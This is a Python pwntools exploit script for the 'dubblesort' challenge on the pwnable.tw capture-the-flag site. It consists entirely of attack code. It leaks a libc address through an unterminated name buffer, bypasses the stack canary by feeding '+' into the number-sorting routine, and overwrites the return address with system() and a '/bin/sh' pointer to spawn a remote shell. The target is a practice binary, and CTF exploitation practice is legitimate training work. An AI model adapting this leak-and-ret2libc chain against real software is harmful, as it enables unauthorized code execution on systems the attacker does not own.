#!/usr/bin/env python3

from pwn import *

exe = ELF('dubblesort_patched', checksec=False)
libc = ELF('libc_32.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10101)
else:
    p = process([exe.path])

GDB()
##########################
### STAGE 1: Leak libc ###
##########################
sa(b'name :', b'A'*(8*3+5))
p.recvuntil(b'A'*(8*3+5))
libc_leak = u32(p.recv(3).ljust(4, b'\x00')) << 8
libc.address = libc_leak - 0x1b0000
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

##########################
### STAGE 2: Get shell ###
##########################
oneshot = [0x3a819, 0x11da9c, 0x11da9d]
sla(b'sort :', b'35')
for i in range(34):
    if i == 24:
        sla(b'number : ', b'+')
    elif i < 24: sla(b'number : ', b'1')
    else: sla(b'number : ', str(libc.sym['system']))

# GDB()
sla(b'number : ', str(next(libc.search(b'/bin/sh\x00'))))
sleep(2)
p.interactive()
